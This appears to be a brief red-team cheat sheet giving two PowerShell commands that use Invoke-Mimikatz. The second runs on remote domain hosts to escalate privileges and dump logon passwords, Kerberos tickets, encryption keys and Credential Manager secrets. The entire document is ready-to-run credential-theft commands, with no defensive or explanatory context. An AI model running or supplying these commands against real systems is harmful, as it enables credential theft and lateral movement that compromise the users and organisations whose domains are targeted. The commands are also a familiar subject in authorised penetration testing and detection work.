# Invoke-Mimikatz
```powershell
Invoke-Mimikatz
```

# Invoke-Mimikatz custom commands on remote machines
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::tickets" "sekurlsa::ekeys" "sekurlsa::credman"' -ComputerName @("<hostname1>.domain.local", "<hostname2>.domain.local")
```
